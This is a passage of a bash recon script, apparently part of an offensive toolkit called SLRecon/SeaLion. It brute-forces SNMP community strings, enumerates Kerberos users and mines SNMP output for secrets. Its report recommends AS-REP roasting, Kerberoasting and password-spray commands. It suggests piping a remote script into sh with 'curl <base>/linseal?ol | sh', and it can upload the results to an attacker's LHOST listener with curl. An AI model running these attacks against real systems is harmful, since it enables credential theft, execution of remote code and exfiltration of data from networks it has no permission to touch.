    section "SNMP (161)"
    info "SNMP community string bruteforce..."
    _snmp_wl="/usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt"
    if [ -f "$_snmp_wl" ]; then
      _snmp_out=$(timeout -k 5s 60s onesixtyone -c "$_snmp_wl" "$TARGET" 2>&1)
      _snmp_probe_status=$?
    else
      _snmp_out=$(printf "public\nprivate\ncommunity\n" | timeout -k 5s 20s onesixtyone -c /dev/stdin "$TARGET" 2>&1)
      _snmp_probe_status=$?
      warn "SNMP community wordlist missing — tested common defaults only"
      _rec "[WARN] SNMP wordlist missing — default communities only"
    fi
    if [ "$_snmp_probe_status" -eq 124 ] || [ "$_snmp_probe_status" -eq 137 ]; then
      warn "SNMP community scan timed out"
      _rec "[WARN] SNMP community scan timed out"
      _snmp_out=""
    elif [ "$_snmp_probe_status" -ne 0 ]; then
      warn "SNMP community scan failed (exit $_snmp_probe_status)"
      [ -n "$_snmp_out" ] && emit "$_snmp_out"
      _rec "[WARN] SNMP community scan failed (exit $_snmp_probe_status)"
      _snmp_out=""
    fi
    if [ -n "$_snmp_out" ] && ! echo "$_snmp_out" | grep -qi "timed out"; then
      hi "SNMP community string found"
      emit "$_snmp_out"
      [ -n "$OUTDIR" ] && echo "$_snmp_out" > "$OUTDIR/snmp.txt"
      _snmp_community=$(echo "$_snmp_out" | head -1 | grep -oE '\[[^]]+\]' | head -1 | tr -d '[]')
      [ -z "$_snmp_community" ] && _snmp_community="public"
      _rec "[ENUM] SNMP accessible (community: $_snmp_community)"

      if _has snmpwalk; then
        if [ -n "$OUTDIR" ]; then
          _snmp_walk_file="$OUTDIR/snmp_walk.txt"
          : > "$_snmp_walk_file"
          _snmp_walk_temp=0
        else
          _snmp_walk_file=$(mktemp 2>/dev/null || echo "/tmp/.slrecon_snmp_$$")
          : > "$_snmp_walk_file"
          _snmp_walk_temp=1
        fi

        for _snmp_spec in \
          "system|1.3.6.1.2.1.1" \
          "interfaces|1.3.6.1.2.1.2.2.1.2" \
          "processes|1.3.6.1.2.1.25.4.2.1" \
          "software|1.3.6.1.2.1.25.6.3.1.2" \
          "users|1.3.6.1.4.1.77.1.2.25"; do
          _snmp_label=${_snmp_spec%%|*}
          _snmp_oid=${_snmp_spec#*|}
          info "SNMP read-only enumeration: $_snmp_label (max 30s)"
          _snmp_walk=$(timeout -k 5s 30s snmpwalk -v2c -c "$_snmp_community" "$TARGET" "$_snmp_oid" 2>&1)
          _snmp_status=$?
          if [ "$_snmp_status" -eq 0 ]; then
            [ -n "$_snmp_walk" ] && emit "$_snmp_walk"
            printf "\n### %s ###\n%s\n" "$_snmp_label" "$_snmp_walk" >> "$_snmp_walk_file"
          elif [ "$_snmp_status" -eq 124 ] || [ "$_snmp_status" -eq 137 ]; then
            warn "SNMP $_snmp_label walk timed out"
            _rec "[WARN] SNMP $_snmp_label walk timed out"
          else
            warn "SNMP $_snmp_label walk failed (exit $_snmp_status)"
            [ -n "$_snmp_walk" ] && emit "$_snmp_walk"
            _rec "[WARN] SNMP $_snmp_label walk failed (exit $_snmp_status)"
          fi
        done

        _snmp_secrets=$(grep -iE 'pass(word)?|secret|token|community|private|key=' "$_snmp_walk_file" 2>/dev/null | head -20) || true
        if [ -n "$_snmp_secrets" ]; then
          hi "Potential secrets found in SNMP data"
          emit "$_snmp_secrets"
          _rec "[PRIVESC] Potential credentials/secrets exposed through SNMP"
        fi
        [ "$_snmp_walk_temp" -eq 1 ] && rm -f "$_snmp_walk_file"
      else
        warn "snmpwalk not installed — SNMP community validated but not enumerated"
        _rec "[WARN] snmpwalk missing — SNMP follow-up incomplete"
      fi
    fi
  else
    warn "onesixtyone not installed — SNMP community discovery skipped"
    _rec "[WARN] SNMP community discovery skipped (onesixtyone missing)"
  fi
  fi

  # ── Kerberos ──
  if _has_port 88; then
    section "Kerberos (88)"
    if _has kerbrute; then
      info "Kerberos user enumeration..."
      _krb_wl=""
      for _kwl in /usr/share/seclists/Usernames/xato-net-10-million-usernames-nt.txt \
                  /usr/share/seclists/Usernames/Names/names.txt; do
        [ -f "$_kwl" ] && _krb_wl="$_kwl" && break
      done
      if [ -n "$_krb_wl" ]; then
        _krb_limit=120
        [ "$MEDIUM" -eq 1 ] && _krb_limit=60
        _krb_out=$(timeout -k 5s "${_krb_limit}s" kerbrute userenum -d "$TARGET" \
          --dc "$TARGET" "$_krb_wl" 2>&1)
        _krb_status=$?
        if [ "$_krb_status" -eq 0 ] && [ -n "$_krb_out" ]; then
          echo "$_krb_out" | grep "VALID" | while IFS= read -r line; do
            hi "$line"
          done
          [ -n "$OUTDIR" ] && echo "$_krb_out" | grep "VALID" > "$OUTDIR/kerberos_users.txt"
          _rec "[ENUM] Valid Kerberos users found — next steps:"
          _rec "  → See $OUTDIR/kerberos_users.txt"
          _rec "  → AS-REP roast: GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip $TARGET -format hashcat"
          _rec "  → Kerberoast: GetUserSPNs.py <domain>/<user>:<pass> -dc-ip $TARGET -request"
          _rec "  → Password spray: kerbrute passwordspray -d <domain> --dc $TARGET users.txt 'Password1'"
        elif [ "$_krb_status" -eq 124 ] || [ "$_krb_status" -eq 137 ]; then
          warn "Kerberos user enumeration timed out"
          _rec "[WARN] Kerberos user enumeration timed out"
        elif [ "$_krb_status" -ne 0 ]; then
          warn "Kerberos user enumeration failed (exit $_krb_status)"
          [ -n "$_krb_out" ] && emit "$_krb_out"
          _rec "[WARN] Kerberos user enumeration failed (exit $_krb_status)"
        fi
      else
        warn "Kerberos username wordlist missing — user enumeration skipped"
        _rec "[WARN] Kerberos user enumeration skipped (username wordlist missing)"
      fi
    else
      warn "kerbrute not installed — Kerberos user enumeration skipped"
      _rec "[WARN] Kerberos user enumeration skipped (kerbrute missing)"
    fi
  fi

  info "Service enumeration completed ($(_elapsed))"
}

# ══════════════════════════════════════════════════════════════
#              PHASE 4 — REPORT
# ══════════════════════════════════════════════════════════════
phase_report() {
  phase_hdr "REPORT"

  section "ATTACK SURFACE SUMMARY"

  # Port summary
  if [ -n "${OPEN_PORTS:-}" ]; then
    info "Open ports: $OPEN_PORTS"
  elif [ -n "$OUTDIR" ] && [ -f "$OUTDIR/open_ports.txt" ]; then
    info "Open ports: $(cat "$OUTDIR/open_ports.txt")"
  fi
  if [ -n "${OPEN_UDP_PORTS:-}" ]; then
    info "Open UDP ports: $OPEN_UDP_PORTS"
  elif [ -n "$OUTDIR" ] && [ -s "$OUTDIR/open_udp_ports.txt" ]; then
    info "Open UDP ports: $(cat "$OUTDIR/open_udp_ports.txt")"
  fi

  # Service versions from nmap
  _report_services=""
  if [ -n "$SERVICES_FILE" ] && [ -f "$SERVICES_FILE" ]; then
    _report_services="$SERVICES_FILE"
  elif [ -n "$OUTDIR" ] && [ -f "$OUTDIR/nmap_services.txt" ]; then
    _report_services="$OUTDIR/nmap_services.txt"
  fi
  if [ -n "$_report_services" ]; then
    emit_raw "\n${W}--- Service versions ---${N}"
    grep -E '^[0-9]+/tcp.*open' "$_report_services" 2>/dev/null | while IFS= read -r line; do
      _svc_ver=$(echo "$line" | sed 's/  */ /g')
      info "$_svc_ver"
      _ver=$(echo "$_svc_ver" | awk '{for(i=4;i<=NF;i++) printf "%s ", $i; print ""}')
      if [ -n "$_ver" ]; then
        _rec "[ENUM] Service version → search: $_ver exploit / CVE"
      fi
    done
  fi

  # ── Recommendations ──
  section "RECOMMENDATIONS"

  if [ -s "$_RECS_FILE" ]; then
    _privesc=0; _enum=0; _info=0; _warn=0

    while IFS= read -r _r; do
      case "$_r" in
        \[PRIVESC\]*) _privesc=$((_privesc + 1)) ;;
        \[ENUM\]*)    _enum=$((_enum + 1)) ;;
        \[INFO\]*)    _info=$((_info + 1)) ;;
        \[WARN\]*)    _warn=$((_warn + 1)) ;;
      esac
    done < "$_RECS_FILE"

    emit_raw "${R}  Privilege Escalation vectors: $_privesc${N}"
    emit_raw "${Y}  Enumeration leads: $_enum${N}"
    emit_raw "${G}  Informational: $_info${N}"
    [ "$_warn" -gt 0 ] && emit_raw "${Y}  Warnings: $_warn${N}"
    emit_raw ""

    if [ "$_privesc" -gt 0 ]; then
      emit_raw "${R}--- Privilege Escalation ---${N}"
      grep '^\[PRIVESC\]' "$_RECS_FILE" | sort -u | while IFS= read -r _r; do
        emit_raw "${R}  ► ${_r#\[PRIVESC\] }${N}"
      done
      emit_raw ""
    fi

    if [ "$_enum" -gt 0 ]; then
      emit_raw "${Y}--- Enumeration ---${N}"
      grep '^\[ENUM\]' "$_RECS_FILE" | sort -u | while IFS= read -r _r; do
        emit_raw "${Y}  ► ${_r#\[ENUM\] }${N}"
      done
      emit_raw ""
    fi

    if [ "$_info" -gt 0 ]; then
      emit_raw "${G}--- Informational ---${N}"
      grep '^\[INFO\]' "$_RECS_FILE" | sort -u | while IFS= read -r _r; do
        emit_raw "${G}  ► ${_r#\[INFO\] }${N}"
      done
      emit_raw ""
    fi

    if [ "$_warn" -gt 0 ]; then
      emit_raw "${Y}--- Warnings ---${N}"
      grep '^\[WARN\]' "$_RECS_FILE" | sort -u | while IFS= read -r _r; do
        emit_raw "${Y}  ► ${_r#\[WARN\] }${N}"
      done
      emit_raw ""
    fi
  else
    info "No notable findings."
  fi

  # ── Next scans ──
  section "NEXT SCANS"
  _has_next=0

  if [ -n "$PHASE" ] && [ "$PHASE" != "report" ]; then
    case "$PHASE" in
      ports)
        emit_raw "${C}  ► Porta scan completata — prosegui con:${N}"
        emit_raw "${W}    recon $TARGET --phase web${N}"
        emit_raw "${W}    recon $TARGET --phase services${N}"
        _has_next=1
        ;;
      web)
        if [ -s "$_RECS_FILE" ] && grep -q 'VHost found\|CMS detected\|Backup file' "$_RECS_FILE" 2>/dev/null; then
          emit_raw "${C}  ► Web enum trovato lead — approfondisci:${N}"
          emit_raw "${W}    recon $TARGET --phase services${N}"
          emit_raw "${W}    recon $TARGET --wordlists        (se non già fatto)${N}"
          _has_next=1
        fi
        ;;
      services|wordlists)
        emit_raw "${C}  ► Scan completato — genera il report:${N}"
        emit_raw "${W}    recon $TARGET --phase report${N}"
        _has_next=1
        ;;
    esac
  fi

  if [ -s "$_RECS_FILE" ]; then
    if grep -q '\[PRIVESC\].*NFS\|no_root_squash' "$_RECS_FILE" 2>/dev/null; then
      emit_raw "${C}  ► NFS trovato — controlla no_root_squash per privesc via SUID${N}"
      _has_next=1
    fi
    if grep -q '\[PRIVESC\].*FTP anonymous' "$_RECS_FILE" 2>/dev/null; then
      emit_raw "${C}  ► FTP anonimo — scarica tutto e cerca credenziali${N}"
      _has_next=1
    fi
    if grep -q '\[PRIVESC\].*Redis\|MySQL\|PostgreSQL\|MongoDB' "$_RECS_FILE" 2>/dev/null; then
      emit_raw "${C}  ► Database accessibile — cerca credenziali per pivot${N}"
      _has_next=1
    fi
    if grep -q 'VHost found' "$_RECS_FILE" 2>/dev/null; then
      emit_raw "${C}  ► VHost trovati — aggiungi a /etc/hosts e scansiona ogni vhost:${N}"
      grep 'VHost found' "$_RECS_FILE" | sort -u | head -5 | while IFS= read -r _vl; do
        emit_raw "${W}    $(echo "$_vl" | sed 's/^\[ENUM\] //')${N}"
      done
      emit_raw "${W}    recon <vhost> --medium${N}"
      _has_next=1
    fi
    if grep -q 'CMS detected' "$_RECS_FILE" 2>/dev/null; then
      emit_raw "${C}  ► CMS trovato — cerca exploit specifici e default credentials${N}"
      _has_next=1
    fi
    if grep -q 'WordPress' "$_RECS_FILE" 2>/dev/null; then
      emit_raw "${C}  ► WordPress — se non già fatto:${N}"
      emit_raw "${W}    wpscan --url http://$TARGET --enumerate ap,at,u --plugins-detection aggressive${N}"
      _has_next=1
    fi
    if grep -q 'zone transfer' "$_RECS_FILE" 2>/dev/null; then
      emit_raw "${C}  ► Zone transfer riuscito — aggiungi hostname e scansiona:${N}"
      emit_raw "${W}    Aggiungi i domini trovati a /etc/hosts${N}"
      emit_raw "${W}    recon <dominio> --medium${N}"
      _has_next=1
    fi
    if grep -q 'Kerberos users' "$_RECS_FILE" 2>/dev/null; then
      emit_raw "${C}  ► Utenti Kerberos trovati — prova AS-REP roast e password spray${N}"
      _has_next=1
    fi
    if grep -q 'LDAP anonymous' "$_RECS_FILE" 2>/dev/null; then
      emit_raw "${C}  ► LDAP anonimo — dump completo dominio e cerca credenziali in descrizioni${N}"
      _has_next=1
    fi
    if grep -q 'SMB share.*WRITE' "$_RECS_FILE" 2>/dev/null; then
      emit_raw "${C}  ► Share SMB scrivibili — possibile upload payload per esecuzione${N}"
      _has_next=1
    fi
    if grep -q 'Hardcoded secrets' "$_RECS_FILE" 2>/dev/null; then
      emit_raw "${C}  ► Secret hardcoded in JS — testa le API key/token trovate${N}"
      _has_next=1
    fi
  fi

  if [ "$FAST" -eq 1 ]; then
    emit_raw "${C}  ► FAST completata — per una copertura bilanciata:${N}"
    emit_raw "${W}    recon $TARGET --medium${N}"
    _has_next=1
  elif [ "$MEDIUM" -eq 1 ]; then
    emit_raw "${C}  ► MEDIUM completata — per la massima profondità:${N}"
    emit_raw "${W}    recon $TARGET${N}"
    _has_next=1
  fi

  if [ -s "$_RECS_FILE" ] && grep -q '^\[WARN\]' "$_RECS_FILE" 2>/dev/null; then
    emit_raw "${Y}  ► Copertura incompleta: controlla la sezione Warnings (tool mancanti, timeout o errori)${N}"
    _has_next=1
  fi

  if [ "$_has_next" -eq 0 ]; then
    info "Nessun suggerimento di follow-up — la recon sembra completa."
    emit_raw "${C}  ► Prossimi passi generici:${N}"
    emit_raw "${W}    curl <base>/linseal?ol | sh     (enumerazione locale post-exploit)${N}"
    emit_raw "${W}    searchsploit <service_version>   (cerca exploit noti)${N}"
  fi

  emit_raw ""

  # Timeline
  emit_raw "\n${W}Total scan time: $(_total_clock)${N}"
}

# ══════════════════════════════════════════════════════════════
#                         RUN
# ══════════════════════════════════════════════════════════════

if [ "$WORDLIST_WORKER" -eq 1 ]; then
  _preflight_dependencies
  phase_wordlists
  _wordlist_worker_status=$?
  if [ -n "$WORDLIST_WORKER_RECS" ]; then
    cp "$_RECS_FILE" "$WORDLIST_WORKER_RECS" 2>/dev/null || _wordlist_worker_status=1
  fi
  info "Separate wordlist worker finished ($(_elapsed))"
  [ "$SERVICES_FILE_TEMP" -eq 1 ] && [ -n "$SERVICES_FILE" ] && rm -f "$SERVICES_FILE"
  [ "$UDP_SERVICES_FILE_TEMP" -eq 1 ] && [ -n "$UDP_SERVICES_FILE" ] && rm -f "$UDP_SERVICES_FILE"
  rm -f "$_RECS_FILE"
  exit "$_wordlist_worker_status"
fi

[ "$PHASE" = "report" ] || _preflight_dependencies

if [ -n "$PHASE" ]; then
  case "$PHASE" in
    ports)      _prepare_privileges; phase_ports ;;
    web)        phase_web ;;
    services)   phase_services ;;
    wordlists)  phase_wordlists ;;
    report)     : ;;
    *)          echo "Unknown phase: $PHASE (use: ports, web, services, wordlists, report)"; exit 1 ;;
  esac
  phase_report
else
  if [ "$FAST" -eq 0 ]; then
    _start_wordlist_companion || true
  fi
  _prepare_privileges
  phase_ports
  phase_web
  [ "$FAST" -eq 0 ] && phase_services
  [ "$FAST" -eq 0 ] && _finish_wordlist_companion
  phase_report
fi

# ── Scan complete banner ─────────────────────────────────────
emit_raw ""
emit_raw "${B}╔══════════════════════════════════════════════╗${N}"
emit_raw "${B}║${G}        SLRecon scan complete                  ${B}║${N}"
emit_raw "${B}╚══════════════════════════════════════════════╝${N}"
emit_raw ""

# ── Save/upload ──────────────────────────────────────────────
if [ -n "$OUTDIR" ] && [ -f "$OUTDIR/report.txt" ]; then
  _lines=$(wc -l < "$OUTDIR/report.txt" 2>/dev/null || echo "?")
  printf "\033[1;32m[+] Report saved to: %s/report.txt (%s lines)\033[0m\n" "$OUTDIR" "$_lines"
fi

if [ "$LOOT" -eq 1 ] && [ -n "$OUTDIR" ] && [ -f "$OUTDIR/report.txt" ]; then
  _uploaded=0
  if [ -n "$LHOST" ]; then
    if [ -n "$SLPORT" ]; then
      _ports="$SLPORT"
    else
      _ports="2727 2020 8080 8000 80 8443 9090"
    fi
    for _port in $_ports; do
      if curl -sf -m 3 -F "file=@${OUTDIR}/report.txt;filename=recon_${TARGET}.txt" "http://${LHOST}:${_port}/upload" >/dev/null 2>&1; then
        printf "\033[1;32m[+] Uploaded to loot: http://%s:%s/upload (recon_%s.txt)\033[0m\n" "$LHOST" "$_port" "$TARGET"
        _uploaded=1
        break
      fi
    done
  fi
  if [ "$_uploaded" -eq 0 ]; then
    printf "\033[1;33m[*] Loot upload failed — could not reach SeaLion server\033[0m\n"
  fi
fi

_stop_sudo_keepalive
[ "$SERVICES_FILE_TEMP" -eq 1 ] && [ -n "$SERVICES_FILE" ] && rm -f "$SERVICES_FILE"
[ "$UDP_SERVICES_FILE_TEMP" -eq 1 ] && [ -n "$UDP_SERVICES_FILE" ] && rm -f "$UDP_SERVICES_FILE"
rm -f "$_RECS_FILE"

if [ "$SILENT" -eq 1 ]; then
  printf "\033[1;32m[+] SLRecon scan complete.\033[0m"
  [ -n "$OUTDIR" ] && printf " \033[1;32mOutput: %s/\033[0m" "$OUTDIR"
  printf "\n"
fi
